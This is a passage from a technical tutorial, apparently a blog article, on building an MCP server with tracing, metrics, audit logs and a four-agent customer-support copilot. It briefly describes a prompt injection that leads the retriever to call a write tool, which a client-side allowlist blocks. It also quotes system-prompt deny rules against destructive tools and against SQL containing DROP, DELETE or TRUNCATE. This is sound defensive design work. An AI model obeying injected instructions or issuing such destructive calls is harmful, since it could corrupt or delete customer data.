So far we have rate limiting via atomic Redis token buckets keyed per (tenant, tool), and a two-tier cache with L1 in-process LRU and L2 shared Redis plus stampede prevention. Agents can burst safely, can never starve each other, and popular cache keys can expire without triggering thundering herds.

## Observability Stack

An MCP server without observability is a system you **do not actually operate**. You can boot it, sure.

> But when an agent returns a strange answer or latency spikes at 3 AM, you will not know why.

![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*dMi7KXpUfoMMsFpVTS8Acg.png)

Observability Stack (Created by Fareed Khan )

Production observability is **three orthogonal signals** working together:

1. **Distributed traces** (OpenTelemetry) so you can follow a single request across every component.
2. **Metrics** (Prometheus) so you can spot trends and alert on them.
3. **Audit logs** (structured JSON lines) so you have a tamper-aware paper trail for compliance.

Each answers a different question. Traces answer “why was this specific request slow”. Metrics answer “are we degrading overall”. Audit logs answer “who did what, when”.

### Distributed Tracing with OpenTelemetry

Every MCP tool call becomes an OpenTelemetry span with useful attributes: tool name, tenant, cache outcome, circuit state, whether the error was retryable.

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*BZm7k3nyVnRPj0Fbm_8oCg.png)

Distributed Tracing (Created by Fareed Khan )

Create `src/atlas_mcp/observability/tracing.py`:

```c
"""Component 11, Distributed tracing.

Every MCP tool call becomes an OpenTelemetry span with:
* atlas.tool, tool name
* atlas.tenant, tenant id
* atlas.cache, hit / miss / bypass
* atlas.retryable_error, if the error is one the agent could retry
* atlas.circuit_state, CLOSED / HALF_OPEN / OPEN at call time

Traces are exported via OTLP to whatever collector you point at
ATLAS_OTEL_ENDPOINT. In docker-compose that is a local OTel Collector
that forwards to Jaeger.

The point of tracing in an MCP server is not pretty graphs; it is so that
when an agent gets a weird answer you can find the specific span where it
went wrong and see the exact arguments, the exact upstream response, and
the exact latency.
"""

from __future__ import annotations
from opentelemetry import trace
from opentelemetry.exporter.otlp.proto.grpc.trace_exporter import OTLPSpanExporter
from opentelemetry.sdk.resources import Resource
from opentelemetry.sdk.trace import TracerProvider
from opentelemetry.sdk.trace.export import BatchSpanProcessor
from atlas_mcp.config import ServerSettings

_INITIALISED = False

def init_tracing(settings: ServerSettings) -> None:
    """Idempotent, safe to call multiple times."""

    global _INITIALISED

    if _INITIALISED:
        return
    resource = Resource.create({
        "service.name": settings.service_name,
        "service.version": "0.1.0",
    })

    provider = TracerProvider(resource=resource)
    exporter = OTLPSpanExporter(endpoint=settings.otel_endpoint, insecure=True)
    provider.add_span_processor(BatchSpanProcessor(exporter))

    trace.set_tracer_provider(provider)

    _INITIALISED = True
```

Three things matter here.

1. First, `Resource.create({"service.name": ...})`. This is how Jaeger knows all these spans came from Atlas-MCP. If you have multiple services exporting to the same collector, the `service.name` is how you filter them apart.
2. Second, `BatchSpanProcessor` batches spans before exporting. Exporting every span immediately would add latency to every request. Batching means we send a batch every few seconds, amortizing the overhead.
3. Third, `init_tracing` is **idempotent**. The global flag prevents double initialization, which matters because OTel panics if you try to set two tracer providers.

Then the helpers:

```c
def get_tracer():
    return trace.get_tracer("atlas_mcp")

def current_trace_id() -> str | None:
    span = trace.get_current_span()

    if span is None or not span.is_recording():
        return None

    ctx = span.get_span_context()

    if not ctx.is_valid:
        return None
    return f"{ctx.trace_id:032x}"
```

`current_trace_id` is the magic that ties everything together. It returns the trace id of the current span in a format that matches what Jaeger shows. When a request's metrics, logs, and audit entries all carry the same trace id, you can move from any one of them to the Jaeger trace and see the full story.

### Prometheus Metrics

Metrics are the other half. Traces tell you about one request in detail, metrics tell you about millions of requests at a glance.

![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*ChCELOOB-1Vo5ZtJKG0QOQ.png)

Prometheus Metric (Created by Fareed Khan )

Create `src/atlas_mcp/observability/metrics.py`:

```c
"""Component 11, Prometheus metrics.

Each metric has *just enough* labels to be useful and not a cardinality bomb.
Notably, we do NOT label by tenant or caller, those explode the series
count and belong in logs and traces, not gauges.
"""

from __future__ import annotations

from prometheus_client import (
    CONTENT_TYPE_LATEST,
    CollectorRegistry,
    Counter,
    Gauge,
    Histogram,
    generate_latest,
)

from starlette.requests import Request
from starlette.responses import Response

class MetricsRegistry:
    """Holds all named Prometheus instruments used throughout the server."""
    def __init__(self, registry: CollectorRegistry | None = None):
        self.registry = registry or CollectorRegistry()
        self.calls_total = Counter(
            "atlas_tool_calls_total",
            "Total tool invocations.",
            ["tool", "status"],
            registry=self.registry,
        )
        self.latency = Histogram(
            "atlas_tool_latency_seconds",
            "End-to-end tool latency.",
            ["tool"],
            buckets=(0.005, 0.01, 0.025, 0.05, 0.1, 0.25, 0.5, 1, 2.5, 5, 10, 30),
            registry=self.registry,
        )
        self.cache_hit = Counter(
            "atlas_cache_hits_total",
            "Cache hits (L1 + L2).",
            ["tool"],
            registry=self.registry,
        )
        self.cache_miss = Counter(
            "atlas_cache_misses_total",
            "Cache misses that hit the tool.",
            ["tool"],
            registry=self.registry,
        )
        self.rate_limited = Counter(
            "atlas_rate_limited_total",
            "Requests rejected by the rate limiter.",
            ["tool"],
            registry=self.registry,
        )
        self.circuit_state = Gauge(
            "atlas_circuit_state",
            "Circuit breaker state (0=closed, 1=half_open, 2=open).",
            ["tool"],
            registry=self.registry,
        )
        self.active_sessions = Gauge(
            "atlas_active_sessions",
            "Active MCP sessions on this replica.",
            registry=self.registry,
        )
```

Read the comment at the top carefully: **“we do NOT label by tenant or caller”**.

> This is one of the most common Prometheus mistakes. If you label metrics by tenant, and you have 10,000 tenants, you end up with 10,000 × N metric time series.

The buckets on the latency histogram matter too. We use a geometric sequence from 5ms to 30s because that covers the realistic range of tool latencies. Too few buckets and your p95 calculations are noisy. Too many and you pay storage for granularity you never use.

Then the exposition endpoint:

```c
_registry_singleton: MetricsRegistry | None = None

def _get_registry() -> MetricsRegistry:
    global _registry_singleton
    if _registry_singleton is None:
        _registry_singleton = MetricsRegistry()
    return _registry_singleton

async def metrics_endpoint(_request: Request) -> Response:
    registry = _get_registry().registry
    return Response(
        content=generate_latest(registry),
        media_type=CONTENT_TYPE_LATEST,
    )
```

`/metrics` is the endpoint Prometheus scrapes every 10 seconds (we configured that in `prometheus.yml` back in section 1). `generate_latest` serializes all instruments into the text format Prometheus expects.

### Structured Audit Logs

The third observability pillar: **audit logs**. These are different from application logs in an important way.

Application logs are for debugging. They are verbose, they might get rotated, they might be incomplete. If a log line is missing, you shrug.

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*OG_l_Q18iPfzNvxHUILX-w.png)

Audit Logs (Created by Fareed Khan )

Audit logs are the paper trail for compliance. They are the answer to “who did what, when, and with what outcome”. They should be **tamper-aware, parseable, and never lost**. A regulator asking for audit logs is not interested in your stack traces.

Create `src/atlas_mcp/observability/audit.py`:

```c
"""Component 11 (audit leg), Structured audit log.

Audit logs are different from application logs. They are the tamper-aware,
regulator-readable paper trail of "who called what, when, and with what
outcome". They should never be lost, rarely be verbose, and always be
parseable.

We emit newline-delimited JSON. One line per tool call. Fields:
* ts, ISO 8601 UTC
* trace_id, correlates with OTel span
* tenant, multi-tenancy scope
* caller, agent subject
* delegator, human who authorised the agent (RFC 8693 actor claim)
* tool, tool name
* args_hash, sha256 of JSON-serialised args (never the args themselves,
              arguments may contain PII; the hash is for correlation)
* duration_ms
* status, ok / error
* error_code, when status = error
"""

from __future__ import annotations
import hashlib
import json
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
import structlog

class AuditLogger:
    """Appends JSON lines to a file plus mirrors to stdout for collectors."""
    def __init__(self, path: str):
        self.path = Path(path)
        self.path.parent.mkdir(parents=True, exist_ok=True)

        # Reconfigure structlog to JSON for the audit channel specifically.
        self._logger = structlog.wrap_logger(
            structlog.get_logger("atlas.audit"),
            processors=[
                structlog.processors.add_log_level,
                structlog.processors.TimeStamper(fmt="iso", utc=True),
                structlog.processors.JSONRenderer(),
            ],
        )
```

We use `structlog` with a JSON renderer because every audit log is **parseable by machines**. Your SIEM (Splunk, Datadog, Chronicle) ingests JSON lines without needing custom regex parsers.

Now the record method:

```c
def record(
        self,
        *,
        trace_id: str | None,
        tenant: str,
        caller: str,
        delegator: str | None,
        tool: str,
        arguments: dict[str, Any],
        duration_ms: float,
        status: str,
        error_code: str | None = None,
    ) -> None:
        event = {
            "ts": datetime.now(timezone.utc).isoformat(),
            "trace_id": trace_id,
            "tenant": tenant,
            "caller": caller,
            "delegator": delegator,
            "tool": tool,
            "args_hash": _hash_args(arguments),
            "duration_ms": round(duration_ms, 3),
            "status": status,
            "error_code": error_code,
        }
        # File sink for durability.
        with self.path.open("a", encoding="utf-8") as fh:
            fh.write(json.dumps(event, default=str) + "\n")
        # Stdout mirror for docker / k8s log collectors.
        self._logger.info("tool_call", **event)

def _hash_args(arguments: dict[str, Any]) -> str:
    payload = json.dumps(arguments, sort_keys=True, default=str).encode()
    return "sha256:" + hashlib.sha256(payload).hexdigest()
```

Two critical design choices here …

- **No raw args logged:** only `args_hash` (SHA-256) to avoid exposing PII while still enabling correlation.
- **Dual logging:** write to **file** (durability) + **stdout** (easy collection by containers).
- **SIEM integration:** ship logs externally for long-term retention and analysis.
- `**delegator**` **field:** identifies the human behind the agent via RFC 8693 `act.sub`.
- **Three signals:** traces (debugging), metrics (health), audit logs (compliance).
- **Shared** `**trace_id**`**:** link all signals for easy cross-navigation.

Every tool call updates all three, and every signal carries the same `trace_id` so you can pivot between them freely.

## Multi Agentic Architecture

This is where Atlas-MCP stops being infrastructure and starts being a product.

> The MCP server exposes tools. The agent layer **uses those tools** to solve a concrete enterprise problem end to end. In our case, that problem is **customer support triage**.

![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*rasNhRMj5Ei93-AEQrbBwQ.png)

Multi-Agentic Architecture (Created by Fareed Khan )

Customer support agents at a company like Acme Commerce answer dozens of tickets a day.

1. Each ticket requires looking up the customer’s profile and tier, their recent orders, their open tickets, and relevant help documentation.
2. That is four separate systems (Postgres, Elasticsearch, another Elasticsearch index, vector store) and four separate queries per ticket. Agents drift between tools, miss context, and resolve tickets slowly.

We want an AI copilot that:

1. Pulls the right data on its own.
2. Drafts a reply the human can send (or edit) with one click.
3. Never invents facts, policies, prices, or dates.
4. Never commits to a refund without human approval.
5. Is bounded in time, tokens, and tool calls so it stays affordable.

### The Four Agent Design

Normally the beginner approach is a single LLM call that does “retrieve + synthesise + verify” in one shot. This **hallucinates reliably** because the model is optimising three objectives at once. It also becomes impossible to debug, when the answer is wrong, you do not know if it was a retrieval problem, a synthesis problem, or a verification problem.

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*kQvJoqYFbttK4DZtR9e0uw.png)

Four Agent Design (Created by Fareed Khan )

The production approach is to **break the task into narrow-role agents** with clear contracts between them:

1. **Planner** turns a customer question into a retrieval plan (no tools, just JSON).
2. **Retriever** executes the plan by calling MCP tools (bounded loop, read-only tools only).
3. **Synthesizer** drafts a reply with citation anchors to the retrieved findings.
4. **Critic** approves the draft or sends it back for one revision.

Each agent has a single job. Each has a different system prompt. Each can be swapped out independently without rewriting the others. When something goes wrong in production, you look at the outputs of each stage and immediately know which agent is misbehaving.

Let’s build them …

First, the base class in `src/atlas_mcp/agents/base.py`:

```c
"""Base classes for the agent layer.

Every agent in Atlas's copilot is a thin wrapper around an Anthropic API
call. The base class handles:
* Token authentication and retries.
* JSON-mode parsing with schema validation.
* Token budget accounting (so the orchestrator can enforce a per-turn cap).
* Structured logging with a shared run_id so you can trace a whole
  conversation across all four agents in one log query.
"""

from __future__ import annotations
import json
import os
import uuid
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import Any
import httpx
import structlog
log = structlog.get_logger("atlas.agents")

@dataclass
class AgentRun:
    """Per-turn accounting, shared across all agents in one user interaction."""
    run_id: str = field(default_factory=lambda: uuid.uuid4().hex)
    tokens_in: int = 0
    tokens_out: int = 0
    tool_calls: int = 0
```

The `AgentRun` is a single object that **all four agents share** for one user interaction. Every LLM call adds to `tokens_in` and `tokens_out`. Every MCP tool call increments `tool_calls`. At the end of the turn, we have a complete cost accounting across all four agents in one place.

The `run_id` is a UUID that threads through every log line and OTel span. Searching for that run\_id in your log aggregator pulls up the entire conversation across all four agents.

Then the LLM client:

```c
class LLM:
    """Minimal async Anthropic Messages client.

    Not the full SDK, just enough surface area for our agents. Isolating it
    here means swapping to a different provider (OpenAI, Bedrock, Vertex)
    means changing one file.
    """

    def __init__(self, api_key: str | None = None, model: str = "claude-opus-4-7"):
        self.api_key = api_key or os.environ.get("ANTHROPIC_API_KEY", "")
        self.model = model
        self.base_url = "https://api.anthropic.com/v1"

    async def complete(
        self,
        system: str,
        messages: list[dict],
        max_tokens: int = 1024,
        tools: list[dict] | None = None,
    ) -> dict:
        body: dict[str, Any] = {
            "model": self.model,
            "max_tokens": max_tokens,
            "system": system,
            "messages": messages,
        }

        if tools:
            body["tools"] = tools

        headers = {
            "x-api-key": self.api_key,
            "anthropic-version": "2023-06-01",
            "content-type": "application/json",
        }

        async with httpx.AsyncClient(timeout=60.0) as client:
            resp = await client.post(f"{self.base_url}/messages", json=body, headers=headers)
            resp.raise_for_status()
            return resp.json()
```

Notice that we do not use the full Anthropic SDK. We hand-roll the HTTP call because our needs are narrow (system + messages + max\_tokens + tools). **Isolating the LLM provider in one file** means swapping to OpenAI, Bedrock, or Vertex is a one-file change. If you depend on SDK-specific features everywhere, migration becomes impossible.

The abstract `Agent` class:

```c
class Agent(ABC):
    """Abstract base. Subclasses override act."""

    name: str = "agent"
    system_prompt: str = ""

    def __init__(self, llm: LLM):
        self.llm = llm

    @abstractmethod
    async def act(self, run: AgentRun, **inputs) -> Any:
        ...

    async def _complete_json(
        self, run: AgentRun, messages: list[dict], max_tokens: int = 512
    ) -> dict:
        resp = await self.llm.complete(self.system_prompt, messages, max_tokens=max_tokens)
        usage = resp.get("usage", {})
        run.tokens_in += usage.get("input_tokens", 0)
        run.tokens_out += usage.get("output_tokens", 0)

        text = _first_text_block(resp)
        log.debug("agent_response", agent=self.name, run_id=run.run_id,
                  tokens_in=usage.get("input_tokens"), tokens_out=usage.get("output_tokens"))
        return _parse_json_lenient(text)

    async def _complete_text(
        self, run: AgentRun, messages: list[dict], max_tokens: int = 512
    ) -> str:

        resp = await self.llm.complete(self.system_prompt, messages, max_tokens=max_tokens)
        usage = resp.get("usage", {})

        run.tokens_in += usage.get("input_tokens", 0)
        run.tokens_out += usage.get("output_tokens", 0)
        return _first_text_block(resp)
```

Every subclass just implements `act(run, **inputs)`. The base class handles token accounting and the two common output modes: JSON (`_complete_json`) and freeform text (`_complete_text`). Having these helpers on the base class means none of the subclasses have to rewrite usage counting or response parsing.

The lenient JSON parser is important because LLMs sometimes return JSON with stray prose or markdown fences:

```c
def _parse_json_lenient(text: str) -> dict:
    """Extract a JSON object from an LLM response even with stray prose."""
    text = text.strip()

    # Strip markdown fences if present.
    if text.startswith("\`\`\`"):
        text = text.split("\`\`\`", 2)[1]
        if text.startswith("json\n"):
            text = text[5:]

    # Find the first { and the matching last }.
    start = text.find("{")
    end = text.rfind("}")

    if start == -1 or end == -1:
        raise ValueError(f"no JSON object in LLM output: {text[:200]!r}")

    return json.loads(text[start:end + 1])
```

We strip triple-backtick fences, then find the outermost `{...}` pair, then parse. This handles the common LLM failure modes without making the prompt more complex.

### Planner Agent

The planner turns a customer question into a retrieval plan. It **does not call tools**. It only emits JSON.

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*Fm_tz1UBsogPo0XDh33Ojg.png)

Planner Agent (Created by Fareed Khan )

Create `src/atlas_mcp/agents/planner.py`:

```c
"""Planner agent, turns a user question into a retrieval plan."""

from __future__ import annotations
import re
from dataclasses import dataclass
from atlas_mcp.agents.base import Agent, AgentRun
from atlas_mcp.agents.prompts import PLANNER_SYSTEM

@dataclass
class PlanStep:
    id: str
    description: str
    priority: int

@dataclass
class Plan:
    needs: list[PlanStep]
    customer_id_required: bool
    notes: str
    # Parsed out of the user message by the planner if present.
    customer_id: str | None = None

# A conservative pattern, alphanumerics, dashes, underscores, 3-64 chars.
_CUSTOMER_ID_RE = re.compile(r"\b(cust|customer|account|acct)[_-]?([A-Za-z0-9\-_]{3,64})\b", re.I)

class PlannerAgent(Agent):

    name = "planner"
    system_prompt = PLANNER_SYSTEM

    async def act(self, run: AgentRun, *, question: str) -> Plan:
        customer_id = self._extract_customer_id(question)
        data = await self._complete_json(
            run,
            messages=[{
                "role": "user",
                "content": f"Customer question:\n{question}\n\n"
                           f"Return a retrieval plan as JSON.",
            }],
            max_tokens=400,
        )
        return Plan(
            needs=[PlanStep(id=n["id"], description=n["description"],
                            priority=int(n.get("priority", 2)))
                   for n in data.get("needs", [])],
            customer_id_required=bool(data.get("customer_id_required")),
            notes=str(data.get("notes", "")),
            customer_id=customer_id,
        )

    @staticmethod
    def _extract_customer_id(question: str) -> str | None:
        match = _CUSTOMER_ID_RE.search(question)
        return match.group(2) if match else None
```

Two things matter here …

- **Deterministic ID extraction:** regex pulls `customer_id` before the LLM (safer, covers common patterns).
- **Typed planning:** return a `Plan` dataclass and fail early on malformed output.

The planner system prompt in `src/atlas_mcp/agents/prompts.py`:

```c
PLANNER_SYSTEM = """\
You are the Planner agent in a customer-support copilot. Your ONLY job is to
turn a customer question into a short, ordered list of information needs that
downstream agents will fetch.

You DO NOT answer the question. You DO NOT call tools. You produce JSON.
Output schema (strict):
{
  "needs": [
    {"id": "n1", "description": "<short noun phrase>", "priority": 1|2|3}
  ],
  "customer_id_required": true|false,
  "notes": "<one line or empty>"
}

Rules:
- At most 5 needs. Prefer 2-3.
- Priority 1 = must have, 2 = helpful, 3 = nice-to-have.
- Never invent a customer id. If the user message does not contain one, set
  customer_id_required=true and stop.
- Return ONLY the JSON object. No prose.
"""
```

**The golden rule of production prompts**: the shorter and more specific the role, the more reliable the output. An agent that is responsible for “being a helpful assistant” will cheerfully invent answers. An agent that is responsible for “reading a question and emitting a 3-need plan JSON” is hard to confuse.

Notice the explicit negatives: “You DO NOT answer the question. You DO NOT call tools.” LLMs love to be helpful and go beyond their assigned role. Explicit negatives push them back into their lane.

### Retriever with Bounded Tool Loop

The retriever is the only agent that actually touches the outside world. It uses a short tool-calling loop, bounded by a max iteration count so a confused LLM cannot spin forever.

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*xgNtuNOKjA2Vz_77xpHb3Q.png)

Retriever with Bounded Tool (Created by Fareed Khan )

Create `src/atlas_mcp/agents/retriever.py`:

```c
"""Retriever agent, executes the plan by calling Atlas-MCP tools.

The retriever is the one agent that actually touches the outside world. It
uses a short tool-calling loop:
    while not done and iterations < cap:
        ask the LLM which tool to call with what arguments
        call the tool via AtlasMCPClient
        append the observation to the running conversation
    return findings

Bounded by max_iterations (default 6) so a confused LLM cannot spin
forever.
"""

from __future__ import annotations
import json

from dataclasses import dataclass, field
from typing import Any

from atlas_mcp.agents.base import Agent, AgentRun
from atlas_mcp.agents.mcp_client import AtlasMCPClient, ToolResult
from atlas_mcp.agents.planner import Plan
from atlas_mcp.agents.prompts import RETRIEVER_SYSTEM

# Tools the retriever is allowed to call. Read-only + composed/workflow
# retrievers. Enforced client-side as a second layer on top of the server's
# policy engine, belt and suspenders.
_ALLOWED_TOOLS = frozenset({
    "customer.build_context",
    "semantic_search",
    "hybrid_search",
    "postgres.query",
    "elasticsearch.search",
    "vector.search",
})
```

Notice `_ALLOWED_TOOLS`. This is a **client-side allowlist**. The MCP server's policy engine already prevents write tools from being called, but we also hardcode the retriever's allowed set client-side. If a prompt injection convinces the retriever to emit `{"tool": "s3.put_object", ...}`, we reject it before it even leaves our process.

**Belt and suspenders** is the right mindset here. A prompt injection that convinces the retriever to call `s3.put_object` still hits the server's "not in allowlist + not authorised" wall. But the client-side check saves us a round trip and provides faster feedback.

The data structures:

```c
@dataclass
class Finding:
    source: str
    summary: str
    raw: Any = None

@dataclass
class RetrievalResult:
    findings: list[Finding] = field(default_factory=list)
    iterations_used: int = 0
    exceeded_budget: bool = False

class RetrieverAgent(Agent):
    name = "retriever"
    system_prompt = RETRIEVER_SYSTEM
    def __init__(self, llm, mcp_client: AtlasMCPClient, max_iterations: int = 6):
        super().__init__(llm)
        self.mcp = mcp_client
        self.max_iterations = max_iterations
```

Each `Finding` has a `source` (which tool), a `summary` (short text for the synthesizer), and `raw` (full data for internal use). The synthesizer uses `summary` to keep its context small, but `raw` is there if you want the full data for a downstream check.

Now we need to build the core loop …

```c
async def act(self, run: AgentRun, *, plan: Plan, question: str) -> RetrievalResult:
        tool_specs = await self._fetch_tool_specs()

        messages: list[dict] = [{
            "role": "user",
            "content": self._build_initial_prompt(question, plan, tool_specs),
        }]

        result = RetrievalResult()
        findings_accum: list[Finding] = []

        for i in range(1, self.max_iterations + 1):
            result.iterations_used = i
            decision = await self._complete_json(run, messages, max_tokens=800)
            if decision.get("done"):
                for f in decision.get("findings", []):
                    findings_accum.append(Finding(
                        source=str(f.get("source", "")),
                        summary=str(f.get("summary", "")),
                    ))
                break

            # Otherwise we expect a tool call instruction.
            tool_name = decision.get("tool")
            arguments = decision.get("arguments") or {}

            if not tool_name:
                messages.append({"role": "assistant", "content": json.dumps(decision)})

                messages.append({
                    "role": "user",
                    "content": "Your last response had no \`tool\` and no \`done\`. "
                               "Emit {\"done\": true, \"findings\": [...]} if you have enough, "
                               "otherwise {\"tool\": \"<name>\", \"arguments\": {...}}."
                })
                continue
```

The loop handles three cases:

1. **Done**: LLM emits `{"done": true, "findings": [...]}`. Accumulate findings, break.
2. **Tool call**: LLM emits `{"tool": "...", "arguments": {...}}`. Execute the tool, feed result back.
3. **Malformed**: LLM emits something else. Give it a precise correction prompt and retry.

Case 3 is important in practice. LLMs sometimes produce freeform text when you want JSON. Instead of crashing, we tell them exactly what shape we need and give them another iteration.

Then the tool call path:

```c
if tool_name not in _ALLOWED_TOOLS:
                observation = ToolResult(
                    ok=False, error_code="tool_not_allowed", retryable=False,
                    hint=f"{tool_name!r} is not in the retriever's allow-list",
                ).as_agent_observation()
            else:
                run.tool_calls += 1
                tool_result = await self.mcp.call_tool(tool_name, arguments)

                # Keep the raw result for synthesis; emit a compact view to the LLM.
                findings_accum.append(Finding(
                    source=tool_name,
                    summary=_summarise_result(tool_result, max_chars=500),
                    raw=tool_result.value,
                ))
                observation = tool_result.as_agent_observation()

        messages.append({"role": "assistant", "content": json.dumps(decision)})
            messages.append({
                "role": "user",
                "content": f"Tool \`{tool_name}\` result:\n{observation}\n\n"
                           f"Decide next step.",
            })
        else:
            result.exceeded_budget = True
        result.findings = findings_accum
        return result
```

If the tool is not in our allowlist, we fabricate a synthetic `tool_not_allowed` error and feed that back to the LLM. The LLM reads the SERF-structured error, learns that this tool is forbidden, and picks a different one.

- **Tool call + context control:** call via MCP, keep full result locally, send only a short summary to the LLM.
- **Loop safeguard:** `for-else` sets `exceeded_budget=True` if no `break` (hit iteration cap).

The retriever’s system prompt is very specific:

```c
RETRIEVER_SYSTEM = """\
You are the Retriever agent. You have access to MCP tools that read data.
Given a plan of information needs and a customer id, you decide which tools
to call and with what arguments. You CAN call multiple tools. You MUST NOT
call destructive tools (anything with "write", "delete", "send", or "put"
in the name).

Preferred tool order:
1. customer.build_context, a single fan-out workflow. Prefer this over
   calling individual atomic tools.
2. hybrid_search or semantic_search, for open-ended documentation lookups.
3. Atomic tools (postgres.query, elasticsearch.search, vector.search) only
   when the composed tools do not fit.

Never construct SQL that contains INSERT, UPDATE, DELETE, DROP, or TRUNCATE.
Never set a top_k above 20.
After each tool result, decide if you have enough to answer. When you are
done, emit exactly one JSON object:

{ "done": true, "findings": [ {"source": "<tool>", "summary": "<1-3 lines>"} ] }
"""
```

The “Preferred tool order” section is where the three-level tool hierarchy pays off. We **explicitly tell the retriever** to prefer the workflow tool, then composed tools, then atomic as a last resort. This is the prompt-level reinforcement that, combined with the tool descriptions from our registry, shifts agent behavior toward the right granularity.

### Synthesizer with Citations

The synthesizer takes findings and drafts a reply with citation anchors.

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*bQMgEcqLeMLCUKOUsLAZXw.png)

Citations Maker (Created by Fareed Khan )

Create `src/atlas_mcp/agents/synthesizer.py`:

```c
"""Synthesizer agent, drafts a customer reply from retrieved findings."""

from __future__ import annotations
from dataclasses import dataclass
from atlas_mcp.agents.base import Agent, AgentRun
from atlas_mcp.agents.prompts import SYNTHESIZER_SYSTEM
from atlas_mcp.agents.retriever import Finding

@dataclass
class Draft:
    text: str
    citations: list[str]

class SynthesizerAgent(Agent):
    name = "synthesizer"
    system_prompt = SYNTHESIZER_SYSTEM
    async def act(self, run: AgentRun, *, question: str, findings: list[Finding]) -> Draft:
        findings_block = "\n".join(
            f"[S{i}] {f.source}: {f.summary}" for i, f in enumerate(findings, start=1)
        )
        prompt = (
            f"Customer question:\n{question}\n\n"
            f"Findings:\n{findings_block}\n\n"
            "Write the draft reply. Use [S1], [S2]... anchors to cite findings."
        )
        text = await self._complete_text(
            run, messages=[{"role": "user", "content": prompt}], max_tokens=400
        )
        citations = _extract_citations(text)
        return Draft(text=text.strip(), citations=citations)

def _extract_citations(text: str) -> list[str]:
    import re
    return sorted(set(re.findall(r"\[S\d+\]", text)))
```

We present findings to the LLM as `[S1] source: summary`, `[S2] source: summary`, and ask it to cite with `[S1]`, `[S2]` anchors in the reply. After generation, we parse out which anchors actually appeared. This gives us the set of findings the draft is grounded in.

Why citations matter so much: **they are how the human can verify**. When the support agent sees the draft, they can click `[S1]` and see exactly which data supported that claim. An uncited claim is suspicious. A cited claim is auditable.

The synthesizer’s prompt is strict:

```c
SYNTHESIZER_SYSTEM = """\
You are the Synthesizer agent. You receive a customer question and a set of
findings gathered by the Retriever. You produce a draft reply for the human
support agent to review and send.

Requirements:
- Cite sources using [S1], [S2] style anchors matching the findings list.
- If the findings are insufficient, say so explicitly. Do not guess.
- No greetings, no sign-offs, those are added by the human.
- Maximum 180 words.
- If the findings contain a refund, cancellation, or policy exception, do
  NOT commit to it; mention that it needs human approval.
"""
```

> **“If the findings are insufficient, say so explicitly. Do not guess”** is the anti-hallucination clause. Combined with the critic agent (coming next), this is what keeps the copilot from inventing refund policies that do not exist.

“Do NOT commit to \[a refund\], mention that it needs human approval” is the governance clause at the prompt level. Even if the agent has access to a refund tool (which it does not, via policy), the prompt would still make it escalate to a human.

### Critic as Gatekeeper

The critic is a second LLM call with a **different role from the synthesizer**. It is not there to rewrite the draft, it is there to **block** bad ones.

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*3IUi_wMhSZ5qQ5bHpEMAWg.png)

GateKeeper (Created by Fareed Khan )

Create `src/atlas_mcp/agents/critic.py`:

```c
"""Critic agent, gatekeeper that blocks bad drafts."""

from __future__ import annotations
from dataclasses import dataclass

from atlas_mcp.agents.base import Agent, AgentRun

from atlas_mcp.agents.prompts import CRITIC_SYSTEM
from atlas_mcp.agents.retriever import Finding
from atlas_mcp.agents.synthesizer import Draft

@dataclass
class Verdict:
    approved: bool
    issues: list[str]
    revision_hints: str | None

class CriticAgent(Agent):

    name = "critic"
    system_prompt = CRITIC_SYSTEM

    async def act(
        self, run: AgentRun, *, question: str, findings: list[Finding], draft: Draft
    ) -> Verdict:
        findings_block = "\n".join(
            f"[S{i}] {f.source}: {f.summary}" for i, f in enumerate(findings, start=1)
        )
        prompt = (
            f"Customer question:\n{question}\n\n"
            f"Findings:\n{findings_block}\n\n"
            f"Draft:\n{draft.text}\n\n"
            "Evaluate the draft against the rules and emit the verdict JSON."
        )
        data = await self._complete_json(
            run, messages=[{"role": "user", "content": prompt}], max_tokens=400
        )
        return Verdict(
            approved=data.get("verdict") == "approve",
            issues=[str(i) for i in data.get("issues", [])],
            revision_hints=data.get("revision_hints"),
        )
```

The critic receives the same findings the synthesizer had, plus the draft. Its job is to check the draft against the findings and flag unsupported claims.

The critic’s system prompt enumerates the things to block:

```c
CRITIC_SYSTEM = """\
You are the Critic agent. Your job is to block bad answers before they reach
customers. Given a question, the findings, and the synthesizer's draft, emit
a verdict as JSON:

{
  "verdict": "approve" | "revise",
  "issues": [ "<short issue>" ],
  "revision_hints": "<one paragraph, only if verdict=revise>"
}

Flag ANY of the following as revise:
- The draft asserts a fact not supported by the findings.
- The draft promises a refund, discount, or exception without an approval.
- The draft contradicts a finding.
- The draft contains a policy number, price, or date not present in findings.
- The draft is over 200 words.

If none of these apply, emit {"verdict": "approve", "issues": []}.
Return ONLY the JSON object.
"""
```

Notice the checklist is **specific and enumerable**. “Asserts a fact not in findings”, “promises a refund without approval”, “contradicts a finding”. Each of these is something a human reviewer could check in 2 seconds. The critic LLM does the same checks at scale.

The critic is a different LLM call from the synthesizer, which means:

1. It has a **different context**, it sees the draft as an output to evaluate, not as something to continue.
2. It has a **different role**, which shifts its token probabilities toward finding flaws rather than writing prose.
3. It can be a **smaller, cheaper model**, because evaluation is easier than generation.

This last point is important for cost. **In production you might run a Claude Opus for the synthesizer (it is writing to real customers) and a Claude Haiku for the critic**. **The smaller model is often better at the pattern-match task of “does claim X appear in findings Y”**.

### The Orchestrator

We have four agents. We need something that wires them together into one coherent flow.

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*7wyopmnCF_mEdxnI8u02uA.png)

The Orchestrator (Created by Fareed Khan )

The orchestrator is the thing you actually call from a backend service. The flow is explicit:

```c
Planner ──▶ Retriever ──▶ Synthesizer ──▶ Critic ──approve ──▶ return draft
                                        └─ revise ──▶ Synthesizer (1 more shot)
```

**At most one revise loop**. This matters. Two reasons.

1. First, a draft that cannot pass the critic after one revision is usually missing information the retriever did not find. Looping indefinitely does not fix that, it just burns tokens.
2. Second, bounded latency. A user-facing copilot that takes 90 seconds to answer is a copilot nobody uses.

Create `src/atlas_mcp/agents/orchestrator.py`:

```c
"""Multi-agent orchestrator, the thing you actually call from a backend.

